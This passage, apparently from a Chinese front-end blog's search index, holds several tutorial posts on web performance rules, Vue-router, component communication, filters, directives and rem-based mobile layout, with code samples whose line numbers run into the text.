在现实世界中，使用外部文件会加快页面显示速度，因为外部文件会被浏览器缓存。如果内置JavaScript和CSS在页面中虽然会减少HTTP请求次数，但增大了页面的大小。另外一方面，使用外部文件，会被浏览器缓存，则页面大小会减小，同时又不增加HTTP请求次数。 因此，一般来说，外部文件是更可行的方式。唯一的例外是内嵌方式对主页更有效，如Yahoo!和My Yahoo!都使用内嵌方式。一般来说，在一个session中，主页访问此时较少，因此内嵌方式可以取得更快的用户响应时间。 法则9. 减少DNS查询次数DNS用于映射主机名和IP地址，一般一次解析需要20～120毫秒。为达到更高的性能，DNS解析通常被多级别地缓存，如由ISP或局域网维护的caching server，本地机器操作系统的缓存（如windows上的DNS Client Service），浏览器。IE的缺省DNS缓存时间为30分钟，Firefox的缺省缓冲时间是1分钟。 减少主机名可减少DNS查询的次数，但可能造成并行下载数的减少。避免DNS查询可减少响应时间，而减少并行下载数可能增加响应时间。一个可行的折中是把内容分布到至少2个，最多4个不同的主机名上。 法则10. 最小化JavaScript代码最小化JavaScript代码指在JS代码中删除不必要的字符，从而降低下载时间。两个流行的工具是#JSMin 和YUI Compressor。 混淆是最小化于源码的备选方式。象最小化一样，它通过删除注释和空格来减少源码大小，同时它还可以对代码进行混淆处理。作为混淆的一部分，函数名和变量名被替换成短的字符串，这使得代码更紧凑，同时也更难读，使得难于被反向工程。Dojo Compressor (ShrinkSafe)是最常见的混淆工具。 最小化是安全的、直白的过程，而混淆则更复杂，而且容易产生问题。从对美国10大网站的调查来看，通过最小化，文件可减少21%，而混淆则可减少25%。 除了最小化外部脚本文件外，内嵌的脚本代码也应该被最小化。即使脚本根据法则4被压缩后传输，最小化脚本刻减少文件大小5%或更高。 法则11. 避免重定向重定向功能是通过301和302这两个HTTP状态码完成的，如： 1 HTTP/1.1 301 Moved Permanently 1 Location: http://example.com/newuri 1 Content-Type: text/html 浏览器自动重定向请求到Location指定的URL上，重定向的主要问题是降低了用户体验。 一种最耗费资源、经常发生而很容易被忽视的重定向是URL的最后缺少/，如访问http://astrology.yahoo.com/astrology将被重定向到http://astrology.yahoo.com/astrology/。在Apache下，可以通过Alias，mod_rewrite或DirectorySlash等方式来解决该问题。 法则12. 删除重复的脚本文件在一个页面中包含重复的JS脚本文件会影响性能，即它会建立不必要的HTTP请求和额外的JS执行。 不必要的HTTP请求发生在IE下，而Firefox不会产生多余的HTTP请求。额外的JS执行，不管在IE下，还是在Firefox下，都会发生。 ​ 一个避免重复的脚本文件的方式是使用模板系统来建立脚本管理模块。除了防止重复的脚本文件外，该模块还可以实现依赖性检查和增加版本号到脚本文件名中，从而实现超长的过期时间。 法则13. 配置ETagsETags是用于确定浏览器缓存中元素是否与Web server中的元素相匹配的机制，它是比last-modified date更灵活的元素验证机制。ETag是用于唯一表示元素版本的字符串，它需被包括在引号中。Web server首先在response中指定ETag： 1 HTTP/1.1 200 OK 1 Last-Modified: Tue, 12 Dec 2006 03:03:59 GMT 1 ETag: \"10c24bc-4ab-457e1c1f\" 1 Content-Length: 12195 后来，如果浏览器需要验证某元素，它使用If-None-Match头回传ETag给Web server，如果ETag匹配，则服务器返回304代码，从而节省了下载时间： 1 GET /i/yahoo.gif HTTP/1.1 1 Host: us.yimg.com 1 If-Modified-Since: Tue, 12 Dec 2006 03:03:59 GMT 1 If-None-Match: \"10c24bc-4ab-457e1c1f\" 1 HTTP/1.1 304 Not Modified ETags的问题在于它们是基于服务器唯一性的某些属性构造的，如Apache1.3和2.x，其格式是inode-size-timestamp，而在IIS5.0和6.0下，其格式是Filetimestamp:ChangeNumber。这样同一个元素在不同的web server上，其ETag是不一样的。这样在多Web server的环境下，浏览器先从server1请求某元素，后来向server2验证该元素，由于ETag不同，所以缓存失效，必须重新下载。 因此，如果您未用到ETags系统提供的灵活的验证机制，最好删除ETag。删除ETag会减少http response及后续请求的HTTP头的大小。微软支持文章描述了如何删除ETags，而在Apache下，只要在配置文件中设置FileETag none即可。 法则14. 缓存Ajax性能优化法则同样适用于web 2.0应用。提高Ajax的性能最重要的方式是使得其response可缓存，就象“法则3增加Expires Header”讨论的那样。以下其他法则同样适用于Ajax，当然法则3是最有效的方式: 法则4. 压缩页面元素 法则9. 减少DNS查询次数 法则10. 最小化脚本文件 法则11. 避免重定向 法则13. 配置ETags. 更多情况下，我们倒不希望Ajax请求被缓存，此时为每个Ajax请求的url附加一个时间戳就可以了。","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"ajax","slug":"ajax","permalink":"http://www.wanyifeng.top/tags/ajax/"},{"name":"css","slug":"css","permalink":"http://www.wanyifeng.top/tags/css/"},{"name":"杂文","slug":"杂文","permalink":"http://www.wanyifeng.top/tags/杂文/"}]},{"title":"Vue-router","date":"2016-12-19T14:13:21.000Z","path":"2016/12/19/Vue路由详解/","text":"单页面应用，浏览器和超连接的跳转方式已经不能适用， 所以各大框架纷纷给出了单页面应用的解决路由跳转的方案。 Vue官方也给出了路由的方案： vue-router; 建议还是用官方的最好，使用量也是最大 vue-router开发的步骤： 第一步： 引入vue和vue-router包。 可以使用cdn的方式或者npm的方式。如果配合npm和webpack的话可以直接作为一个模块导入即可。 12import VueRouter from 'vue-router'Vue.use(VueRouter) 第二步： 定义路由跳转的组件 123// 1. 定义（路由）组件。import home from \"./Components/home/home.vue\"import newsList from \"./Components/news/newsList.vue\" 第三步： 定义路由规则对象 12345678910111213// 每个路由path应该映射一个组件。 其中\"component\" 可以是// 通过 Vue.extend() 创建的组件构造器，// 或者，只是一个组件配置对象。const routes = [ &#123; path: \"/\", redirect: \"home\" &#125;,//这条为重定向 &#123; name: \"home\", path: \"/home\", component: home &#125;, &#123; name: \"newsList\", path: \"/newsList\", component: newsList &#125;,]// 创建路由对象const router = new VueRouter(&#123; routes // （缩写）相当于 routes: routes，es6的新语法&#125;) 第四步： 创建Vue对象，并加重上面创建的路由对象 123456// 记得要通过 router 配置参数注入路由，// 从而让整个应用都有路由功能const app = new Vue(&#123; router&#125;).$mount('#app')//如果使用webpack render: c =&gt; c(App), //使用webpack,渲染App.vue这个根组件 第五步： 在模板中编写路由跳转链接 12345678910111213&lt;div id=\"app\"&gt; &lt;h1&gt;Hello App!&lt;/h1&gt; &lt;p&gt; &lt;!-- 使用 router-link 组件来导航. --&gt; &lt;!-- 通过传入 `to` 属性指定链接. --&gt; &lt;!-- &lt;router-link&gt; 默认会被渲染成一个 `&lt;a&gt;` 标签 --&gt; &lt;router-link to=\"/foo\"&gt;Go to Foo&lt;/router-link&gt; &lt;router-link to=\"/newsList\"&gt;Go to Bar&lt;/router-link&gt; &lt;/p&gt; &lt;!-- 路由出口 --&gt; &lt;!-- 路由匹配到的组件将渲染在这里 --&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt; 重定向 redirect1234const routes = [ &#123; path: '/', redirect: '/index'&#125;, // 这样进/ 就会跳转到/index &#123; path: '/index', component: index &#125;] 嵌套路由1234567const routes = [ &#123; path: '/index', component: index, children: [ &#123; path: 'info', component: info&#125; ] &#125;] 通过/index/info就可以访问到info组件了 懒加载1234const routes = [ &#123; path: '/index', component: resolve =&gt; require(['./index.vue'], resolve) &#125;, &#123; path: '/hello', component: resolve =&gt; require(['./hello.vue'], resolve) &#125;,] 通过懒加载就不会一次性把所有组件都加载进来，而是当你访问到那个组件的时候才会加载那一个。对于组件比较多的应用会提高首次加载速度。 路由参数获取定义路由路径的时候，可以指定参数。参数需要通过路径进行标识：/user/:id就是定义了一个规则，/user开头，然后后面的就是id参数的值。比如： 12345678路由规则： /user/:id/user/9 =&gt; id = 9/user/8 =&gt; id = 8/user/1 =&gt; id = 1然后在跳转后的vue中可以通过this.$route.params.参数名获取对应的参数。路由规则： /registerrouter.push(&#123; path: 'register', query: &#123; plan: 'private' &#125;&#125;)然后在跳转后的vue中可以通过this.$route.query.参数名获取对应的参数。 js控制路由跳转上面我们演示的都是通过router-link进行跳转。 其实我们还可以通过js编程的方式进行路由的跳转。 1234567891011// 当前路由的view跳转到 /homerouter.push('home')// 对象, 跳转到/homerouter.push(&#123; path: 'home' &#125;)// 命名的路由 router.push(&#123; name: 'user', params: &#123; userId: 123 &#125;&#125;)// 带查询参数，变成 /register?plan=privaterouter.push(&#123; path: 'register', query: &#123; plan: 'private' &#125;&#125;) 嵌套路由嵌套路由跟普通路由基本没有什么区别。但是可以让vue开发变的非常灵活。官网这块写的也非常好，我就直接拷贝了（原谅我吧。）实际生活中的应用界面，通常由多层嵌套的组件组合而成。同样地，URL 中各段动态路径也按某种结构对应嵌套的各层组件，例如： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;div id=\"app\"&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt;const User = &#123; template: '&lt;div&gt;User &#123;&#123; $route.params.id &#125;&#125;&lt;/div&gt;'&#125;const router = new VueRouter(&#123; routes: [ &#123; path: '/user/:id', component: User &#125; ]&#125;)这里的 &lt;router-view&gt; 是最顶层的出口，渲染最高级路由匹配到的组件。同样地，一个被渲染组件同样可以包含自己的嵌套 &lt;router-view&gt;。例如，在 User 组件的模板添加一个 &lt;router-view&gt;：const User = &#123; template: ` &lt;div class=\"user\"&gt; &lt;h2&gt;User &#123;&#123; $route.params.id &#125;&#125;&lt;/h2&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; `&#125;要在嵌套的出口中渲染组件，需要在 VueRouter 的参数中使用 children 配置：const router = new VueRouter(&#123; routes: [ &#123; path: '/user/:id', component: User, children: [ &#123; // 当 /user/:id/profile 匹配成功， // UserProfile 会被渲染在 User 的 &lt;router-view&gt; 中 path: 'profile', component: UserProfile &#125;, &#123; // 当 /user/:id/posts 匹配成功 // UserPosts 会被渲染在 User 的 &lt;router-view&gt; 中 path: 'posts', component: UserPosts &#125; ] &#125; ]&#125;) 要注意，以 / 开头的嵌套路径会被当作根路径。 这让你充分的使用嵌套组件而无须设置嵌套的路径。你会发现，children 配置就是像 routes 配置一样的路由配置数组，所以呢，你可以嵌套多层路由。 此时，基于上面的配置，当你访问 /user/foo 时，User 的出口是不会渲染任何东西，这是因为没有匹配到合适的子路由。如果你想要渲染点什么，可以提供一个 空的 子路由：或者重定向 123456789101112const router = new VueRouter(&#123; routes: [ &#123; path: '/user/:id', component: User, children: [ // 当 /user/:id 匹配成功， // UserHome 会被渲染在 User 的 &lt;router-view&gt; 中 &#123; path: '', component: UserHome &#125;, ] &#125; ]&#125;) 综合代码 123456789&lt;body&gt; &lt;div id=\"app\"&gt; &lt;router-link to='/login'&gt;登录&lt;/router-link&gt; &lt;router-link to='/register/rose'&gt;注册&lt;/router-link&gt; &lt;!-- 显示的内容 --&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt;&lt;/body&gt; 123456789101112131415161718192021222324252627282930313233//定义好登录组件var loginComponent = Vue.extend(&#123; template : '&lt;h2&gt; 登录 &lt;/h2&gt;'&#125;)//定义好注册组件 注册var registerComponent = Vue.extend(&#123; template : '&lt;h2&gt; 注册 --- &#123;&#123;username&#125;&#125; &lt;/h2&gt;', data:function()&#123; return &#123; username : '' &#125; &#125;, created()&#123; console.log(this.$route.params.username); // 通过 this.$route.params.username 获取参数 this.username = this.$route.params.username; &#125;&#125;)//创建好路由,并注册相关组件var vueRouter = new VueRouter(&#123; routes : [ &#123;name:'login',path:'/login',component:loginComponent&#125;, &#123;name:'register',path:'/register/:username',component:registerComponent&#125;//通过路由传递参数 ]&#125;);//创建Vue对象var vue = new Vue(&#123; el:'#app', router:vueRouter&#125;);","comments":true,"tags":[{"name":"Vue","slug":"Vue","permalink":"http://www.wanyifeng.top/tags/Vue/"}]},{"title":"Vue模块通讯","date":"2016-12-19T13:35:53.000Z","path":"2016/12/19/Vue模块通讯/","text":"父子组件通讯父组件通过子组件的prop进行传递数据，而且数据传递是单向的。也就是说：父组件可以把数据传递给子组件，但是反之则不同。如下图所示： 父组件123&lt;div&gt; &lt;comment :stockcount=\"goodsInfo.stock_quantity\"&gt;&lt;/comment&gt;&lt;/div&gt; 子组件1props: [\"stockcount\"] 单向数据流动单方向的数据流动带来了非常简洁和清晰的数据流，纯展示性或者独立性较强的模块的开发确实非常方便和省事。但是复杂的页面逻辑，组件之间的数据共享处理就会需要通过事件总线的方式解决或者使用Vue的Vuex框架了。 子组件通知父组件数据更新：事件方式的实现子组件可以在子组件内触发事件，然后在父容器中添加子组件时绑定父容器的方法为事件响应方法的方式.如下图所示： 使用 v-on 绑定自定义事件 123每个 Vue 实例都实现了事件接口(Events interface)，即：使用 $on(eventName) 监听事件使用 $emit(eventName) 触发事件 子组件 123456789101112131415161718export default &#123; data() &#123; return &#123; count: 1 &#125; &#125;, methods: &#123; substrict() &#123; if (this.count &lt;= 1) return this.$emit(\"goodsCount\",--this.count) &#125;, add() &#123; if (this.count &gt;= this.stockcount) return this.$emit(\"goodsCount\",++this.count) &#125;, &#125;, props: [\"stockcount\"]&#125; 父组件 1&lt;subAdd @goodsCount=\"getgoodsCountData\"&gt;&lt;/subAdd&gt; 12345678910111213export default &#123; data() &#123; return &#123;&#125; &#125;, methods: &#123; getgoodsCountData(data) &#123; this.shopNumber = data &#125; &#125;, components: &#123; subAdd &#125;&#125; 事件总线方式解决非父子组件数据同步如果非父子组件怎么通过事件进行同步数据，或者同步消息呢？Vue中的事件触发和监听都是跟一个具体的Vue实例挂钩。所以在不同的Vue实例中想进行事件的统一跟踪和触发，那就需要一个公共的Vue实例，这个实例就是公共的事件对象。 定义bus的Vue对象 12import Vue from 'vue'export const bus = new Vue(); 定义触发的事件 1234import &#123; bus &#125; from './tools/bus.js'bus.$on(\"shopCartNumber\", number =&gt; &#123; console.log(\"触发了,发送参数\"+number)&#125;) 触发事件 1bus.$emit(\"shopCartNumber\", this.shopNumber)","comments":true,"tags":[{"name":"Vue","slug":"Vue","permalink":"http://www.wanyifeng.top/tags/Vue/"}]},{"title":"Vue-filter","date":"2016-12-18T04:13:21.000Z","path":"2016/12/18/Vue过滤器/","text":"Vue.js 允许你自定义过滤器，被用作一些常见的文本格式化。过滤器应该被添加在 mustache 插值的尾部，由“管道符”指示： 全局的过滤器1234567891011121314151617Vue.filter('toLowerCase',function(input)&#123; //第一个参数为过滤器的名字 第二个参数为回调函数 在回调函数中返回过滤完成后的数据 return input.toLowerCase(); &#125;) var vue = new Vue(&#123; el:\"#app\", data:&#123; message : 'Hello Vue' &#125; &#125;); var vue2 = new Vue(&#123; el:\"#app2\", data:&#123; msg : 'GOOD MORNING' &#125; &#125;); 1234567&lt;div id=\"app\"&gt; &#123;&#123;message | toLowerCase&#125;&#125; // \"|\"管道符 为过滤器的意思 后面跟着过滤器的名字 &lt;/div&gt;&lt;div id=\"app2\"&gt; &#123;&#123;msg | toLowerCase(msg,\"vue2\")&#125;&#125; // 过滤器可以传递参数一般第一个参数为为本身可以省略不写 其他参数 可以根据定义过滤器的规则进行传参 &lt;/div&gt; ##私有的过滤器 1234567891011121314151617181920212223var vue = new Vue(&#123; el:\"#app\", data:&#123; message : 'Hello Vue' &#125;, filters:&#123; toLowerCase:function(input)&#123; return input.toLowerCase(); &#125; &#125; &#125;); var vue2 = new Vue(&#123; el:\"#app2\", data:&#123; msg : 'GOOD MORNING' &#125;, filters:&#123; toLowerCase:function(input)&#123; return input.toLowerCase(); &#125; &#125; &#125;); 1234567&lt;div id=\"app\"&gt; &#123;&#123;message | toLowerCase&#125;&#125;&lt;/div&gt;&lt;div id=\"app2\"&gt; &#123;&#123;msg | toLowerCase&#125;&#125;&lt;/div&gt; 私有过滤器定义在当前的Vue对象里面 绑定的数据过滤器1234567891011121314151617181920212223&#123;&#123; message | capitalize &#125;&#125;&lt;!-- in mustaches --&gt;&#123;&#123; message | capitalize &#125;&#125;&lt;!-- in v-bind --&gt;&lt;div v-bind:id=\"rawId | formatId\"&gt;&lt;/div&gt;Vue 2.x 中，过滤器只能在 mustache 绑定和 v-bind 表达式（从 2.1.0 开始支持）中使用，因为过滤器设计目的就是用于文本转换。为了在其他指令中实现更复杂的数据变换，你应该使用计算属性。过滤器函数总接受表达式的值作为第一个参数。new Vue(&#123; // ... filters: &#123; capitalize: function (value) &#123; if (!value) return '' value = value.toString() return value.charAt(0).toUpperCase() + value.slice(1) &#125; &#125;&#125;)过滤器可以串联：&#123;&#123; message | filterA | filterB &#125;&#125;过滤器是 JavaScript 函数，因此可以接受参数：&#123;&#123; message | filterA('arg1', arg2) &#125;&#125;这里，字符串 'arg1' 将传给过滤器作为第二个参数， arg2 表达式的值将被求值然后传给过滤器作为第三个参数。","comments":true,"tags":[{"name":"Vue","slug":"Vue","permalink":"http://www.wanyifeng.top/tags/Vue/"}]},{"title":"Vue-Vue简介","date":"2016-12-17T02:03:21.000Z","path":"2016/12/17/Vue简介/","text":"Vue是一个前端的双向绑定类的框架，发音[读音 /vjuː/, 类似于 view]。新的Vue版本参考了React的部分设计，当然也有自己独特的地方，比如Vue的单文件组件开发方式都很有创新，另外Vue自身的一些绑定的语法、用法等都非常精炼，很容易上手，而且第三方的插件都非常丰富，社区非常活跃，最新的文档都有中文版本。而且Vue配合官方的和第三方的库可以实现单文件的组件化开发、SPA等现代化前端开发。详情请参考Vue官网 Vue的入门demoVue 可以直接把它当做一个js库使用，所以它可以很容易的接入到你的项目或者单个页面中。甚至你可以只使用它的双向绑定功能。所以它很容易上手。 比如：我们有一个需求，一个网页上一个Div标签，我们有一个json对象存储数据，把json对象上的数据放到Div上去。 接下来是步骤：12345678910第一步： 创建一个文件夹并创建一个html文件 比如：index.html.当如你可以选择你自己的编辑器，我就用VSCode。第二步：引入Vue库&lt;script src=\"https://unpkg.com/vue/dist/vue.js\"&gt;&lt;/script&gt;当然了你可以直接下载Vue的js文件，推荐你直接用上面的cdn即可。第三步：创建一个Div，给它一个id，比如：app第四步：创建Vue的对象，并把数据绑定到上面创建好的div上去。 最终的代码如下：1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt; &lt;!--第一步：创建文件夹及html文件--&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Vue入门之Helloworld&lt;/title&gt; &lt;!--第二步：引入Vue库--&gt; &lt;script src=\"https://unpkg.com/vue/dist/vue.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!--第三步:创建一个Div--&gt; &lt;div id=\"app\"&gt; &lt;!--Vue的模板的绑定数据的方法， 类似于很多其他前端的模板，可以用两对花括号进行绑定Vue中的数据对象的属性 --&gt; &#123;&#123; message &#125;&#125; &lt;/div&gt; &lt;!--第四步：创建Vue的对象，并把数据绑定到上面创建好的div上去。--&gt; &lt;script&gt; var app = new Vue(&#123; // 创建Vue对象。Vue的核心对象。 el: '#app', // el属性：把当前Vue对象挂载到 div标签上，#app是id选择器 data: &#123; // data: 是Vue对象中绑定的数据 message: 'Hello Vue!' // message 自定义的数据 &#125; &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 最终的结果就是：1Hello Vue!","comments":true,"tags":[{"name":"Vue","slug":"Vue","permalink":"http://www.wanyifeng.top/tags/Vue/"}]},{"title":"web app变革之rem（手机屏幕实现全适配）","date":"2016-12-15T03:23:21.000Z","path":"2016/12/15/web app变革之rem（手机屏幕实现全适配）/","text":"以往web移动适配，常规写法是：media only screen 12345678910111213141516171819@media only screen and (min-device-width: 320px)&#123; //针对iPhone 3 &#125; @media only screen and (min-device-width: 320px)and (-webkit-min-device-pixel-ratio: 2) &#123; //针对iPhone 4, 5c,5s, 所有iPhone6的放大模式，个别iPhone6的标准模式 &#125; @media only screen and (min-device-width: 375px)and (-webkit-min-device-pixel-ratio: 2) &#123; //针对大多数iPhone6的标准模式 &#125; @media only screen and (min-device-width: 375px)and (-webkit-min-device-pixel-ratio: 3) &#123; //针对所有iPhone6+的放大模式 &#125; @media only screen and (min-device-width:412px) and (-webkit-min-device-pixel-ratio: 3) &#123; //针对所有iPhone6+的标准模式,414px写为412px是由于三星Nexus 6为412px，可一并处理 &#125; 做移动端Web兼容测试时候，不能将Chrome模拟效果同iPhone6/Plus真机完全划等号。一定要在确认了iPhone设备所处显示模式和真实屏宽后再针对性的进行调试。 退一步说，姑且认为标准模式和放大模式下设备宽度都是320px的情况属于个例。不过在没有确认iPhone6/iPhone 6 Plus是处于标准模式还是放大模式的前提下，来测试CSS媒体查询代码，来查看真机预览效果，都是不靠谱的做法。因此，在未确认设备显示模式的情况下，这个结论是完全成立的：iPhone6屏宽不一定是375px，iPhone6 Plus屏宽不一定是414px。 ———————————— web移动适配新办法实现全适配 ———————————— rem这是个低调的css单位，近一两年开始崭露头角，有许多同学对rem的评价不一，有的在尝试使用，有的在使用过程中遇到坑就弃用了。但是我对rem综合评价是用来做web app它绝对是最合适的人选之一。 rem是什么？ rem（font size of the root element）是指相对于根元素的字体大小的单位。简单的说它就是一个相对单位。看到rem大家一定会想起em单位，em（font size of the element）是指相对于父元素的字体大小的单位。它们之间其实很相似，只不过一个计算的规则是依赖根元素一个是依赖父元素计算。为什么web app要使用rem？ 这里我特别强调web app，web page就不能使用rem吗，其实也当然可以，不过出于兼容性的考虑在web app下使用更加能突显这个单位的价值和能力，接下来我们来看看目前一些企业的web app是怎么做屏幕适配的。1、实现强大的屏幕适配布局： 最近iphone6一下出了两款尺寸的手机，导致的移动端的屏幕种类更加的混乱，记得一两年前做web app有一种做法是以320宽度为标准去做适配，超过320的大小还是以320的规格去展示，这种实现方式以淘宝web app为代表作，但是近期手机淘宝首页进行了改版，采用了rem这个单位，首页以内依旧是和以前一样各种混乱，有定死宽度的页面，也有那种流式布局的页面。 我们现在在切页面布局的使用常用的单位是px，这是一个绝对单位，web app的屏幕适配有很多中做法，例如：流式布局、限死宽度，还有就是通过响应式来做，但是这些方案都不是最佳的解决方法。 例如流式布局的解决方案有不少弊端，它虽然可以让各种屏幕都适配，但是显示的效果极其的不好，因为只有几个尺寸的手机能够完美的显示出视觉设计师和交互最想要的效果，但是目前行业里用流式布局切web app的公司还是挺多的，看看下面我收集的一些案例： 1.亚马逊： 2.携程： 3.兰亭 上面的网站都是采用的流式布局的技术实现的，他们在页面布局的时候都是通过百分比来定义宽度，但是高度大都是用px来固定住，所以在大屏幕的手机下显示效果会变成有些页面元素宽度被拉的很长，但是高度还是和原来一样，实际显示非常的不协调，这就是流式布局的最致命的缺点，往往只有几个尺寸的手机下看到的效果是令人满意的，其实很多视觉设计师应该无法接受这种效果，因为他们的设计图在大屏幕手机下看到的效果相当于是被横向拉长来一样。 流式布局并不是最理想的实现方式，通过大量的百分比布局，会经常出现许多兼容性的问题，还有就是对设计有很多的限制，因为他们在设计之初就需要考虑流式布局对元素造成的影响，只能设计横向拉伸的元素布局，设计的时候存在很多局限性。2.固定宽度做法 还有一种是固定页面宽度的做法，早期有些网站把页面设置成320的宽度，超出部分留白，这样做视觉，前端都挺开心，视觉在也不用被流式布局限制自己的设计灵感了，前端也不用在搞坑爹的流式布局。但是这种解决方案也是存在一些问题，例如在大屏幕手机下两边是留白的，还有一个就是大屏幕手机下看起来页面会特别小，操作的按钮也很小，手机淘宝首页起初是这么做的，但近期改版了，采用了rem。3.响应式做法 响应式这种方式在国内很少有大型企业的复杂性的网站在移动端用这种方法去做，主要原因是工作大，维护性难，所以一般都是中小型的门户或者博客类站点会采用响应式的方法从web page到web app直接一步到位，因为这样反而可以节约成本，不用再专门为自己的网站做一个web app的版本。4.设置viewport进行缩放 天猫的web app的首页就是采用这种方式去做的，以320宽度为基准，进行缩放，最大缩放为320*1.3 = 416，基本缩放到416都就可以兼容iphone6 plus的屏幕了，这个方法简单粗暴，又高效。说实话我觉得他和用接下去我们要讲的rem都非常高效，不过有部分同学使用过程中反应缩放会导致有些页面元素会糊的情况。 rem能等比例适配所有屏幕 上面讲了一大堆目前大部分公司主流的一些web app的适配解决方案，接下来讲下rem是如何工作的。 上面说过rem是通过根元素进行适配的，网页中的根元素指的是html我们通过设置html的字体大小就可以控制rem的大小。举个例子： html{font-size:20px;}.btn {width: 6rem;height: 3rem;line-height: 3rem;font-size: 1.2rem;display: inline-block;background: #06c;color: #fff;border-radius: .5rem;text-decoration: none;text-align: center;} Demo 上面代码结果按钮大小如下图： 我把html设置成10px是为了方便我们计算，为什么6rem等于60px。如果这个时候我们的.btn的样式不变，我们再改变html的font-size的值，看看按钮发生上面变化: html{font-size:40px;} Demo 按钮大小结果如下： 上面的width，height变成了上面结果的两倍，我们只改变了html的font-size，但.btn样式的width,height的rem设置的属性不变的情况下就改变了按钮在web中的大小。 其实从上面两个案例中我们就可以计算出1px多少rem: 第一个例子： 120px = 6rem * 20px(根元素设置大值) 第二个例子： 240px = 6rem * 40px(根元素设置大值) 推算出： 10px = 1rem 在根元素（font-size = 10px的时候）； 20px = 1rem 在根元素（font-size = 20px的时候）； 40px = 1rem 在根元素（font-size = 40px的时候）； 在上面两个例子中我们发现第一个案例按钮是等比例放大到第二个按钮，html font-size的改变就会导致按钮的大小发生改变，我们并不需要改变先前给按钮设置的宽度和高度，其实这就是我们最想看到的，为什么这么说？接下来我们再来看一个例子： Demo 由上面两个的demo中我们知道改变html的font-size可以等比改变所有用了rem单位的元素，所以大家可以通过chrome浏览器的调试工具去切换第三个的demo在不同设备下的展示效果，或者通过缩放浏览器的宽度来查看效果，我们可以看到不管在任何分辨率下，页面的排版都是按照等比例进行切换，并且布局没有乱。我只是通过一段js根据浏览器当前的分辨率改变font-size的值，就简单的实现了上面的效果，页面的所有元素都不需要进行任何改变。 到这里肯定有很多人会问我是怎么计算出不同分辨率下font-size的值？ 首先假设我上面的页面设计稿给我时候是按照640的标准尺寸给我的前提下，（当然这个尺寸肯定不一定是640，可以是320，或者480，又或是375）来看一组表格。 上面的表格蓝色一列是Demo3中页面的尺寸，页面是以640的宽度去切的，怎么计算不同宽度下font-site的值，大家看表格上面的数值变化应该能明白。举个例子：384/640 = 0.6，384是640的0.6倍，所以384页面宽度下的font-size也等于它的0.6倍，这时384的font-size就等于12px。在不同设备的宽度计算方式以此类推。 Demo3中我是通过JS去动态计算根元素的font-size，这样的好处是所有设备分辨率都能兼容适配，淘宝首页目前就是用的JS计算。但其实不用JS我们也可以做适配，一般我们在做web app都会先统计自己网站有哪些主流的屏幕设备，然后去针对那些设备去做media query设置也可以实现适配，例如下面这样： 12345678910111213141516171819202122232425262728html &#123; font-size : 20px;&#125;@media only screen and (min-width: 401px)&#123; html &#123; font-size: 25px !important; &#125;&#125;@media only screen and (min-width: 428px)&#123; html &#123; font-size: 26.75px !important; &#125;&#125;@media only screen and (min-width: 481px)&#123; html &#123; font-size: 30px !important; &#125;&#125;@media only screen and (min-width: 569px)&#123; html &#123; font-size: 35px !important; &#125;&#125;@media only screen and (min-width: 641px)&#123; html &#123; font-size: 40px !important; &#125;&#125; 上面的做的设置当然是不能所有设备全适配，但是用JS是可以实现全适配。具体用哪个就要根据自己的实际工作场景去定了。 下面推荐两个国内用了rem技术的移动站，大家可以上去参考看看他们的做法，手机淘宝目前只有首页用了rem，淘宝native app的首页是内嵌的web app首页。 淘宝首页：m.taobao.com D X：m.dx.com 转载：腾讯ISUX (http://isux.tencent.com/web-app-rem.html)","comments":true,"tags":[{"name":"css","slug":"css","permalink":"http://www.wanyifeng.top/tags/css/"}]},{"title":"Vue指令介绍","date":"2016-12-13T08:13:21.000Z","path":"2016/12/13/Vue指令介绍/","text":"v-text123&lt;span v-text=\"msg\"&gt;&lt;/span&gt;&lt;!-- 和下面的一样 --&gt;&lt;span&gt;&#123;&#123;msg&#125;&#125;&lt;/span&gt; v-html1&lt;div v-html=\"html\"&gt;&lt;/div&gt; 指令的值可以为标签 v-show1&lt;h1 v-show=\"内容转换为Bool值\"&gt;Hello!&lt;/h1&gt; true显示false隐藏 v-if &amp;&amp; v-else $$ v-else-if 有时候我们要根据数据的情况，决定标签是否进行显示或者有其他动作。最常见的就是，表格渲染的时候，如果表格没有数据，就显示无数据。如果有数据就显示表格数据。Vue帮我们提供了一个v-if的指令，帮助我们完成判断的模板处理。 123456789&lt;div v-if=\"Math.random() &gt; 0.5\"&gt; 1&lt;/div&gt;&lt;div v-else-if&gt; 2&lt;/div&gt;&lt;div v-else&gt; 3&lt;/div&gt; 类似于 v-else,，v-else-if 必须紧跟在 v-if 或者 v-else-if 元素之后。 v-for 模板引擎都会提供循环的支持。Vue也不例外，Vue是提供了一个v-for指令。基本的用法类似于foreach的用法。还是看例子最直接，上代码： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;div id=\"app\"&gt; &lt;table&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;年龄&lt;/th&gt; &lt;th&gt;地址&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;!-- 每次for循环，都会创建一个tr标签。item是遍历的元素。 --&gt; &lt;tr v-for=\"item in UserList\" &gt; &lt;td&gt;&#123;&#123; item.name &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123; item.age &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123; item.address &#125;&#125;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt;&lt;/div&gt;&lt;script&gt; var app = new Vue(&#123; el: '#app', data: &#123; UserList: [ &#123;'name': 'malun', 'age': 18, 'address': '北京黑地下室'&#125;, &#123;'name': 'flydragon', 'age': 22, 'address': '厦门的很多热的地方'&#125;, &#123;'name': 'temp', 'age': 25, 'address': '东北松花江上'&#125; ] &#125; &#125;);&lt;/script&gt;&lt;div v-for=\"(item, index) in items\"&gt;&lt;/div&gt;&lt;div v-for=\"(val, key) in object\"&gt;&lt;/div&gt;&lt;div v-for=\"(val, key, index) in 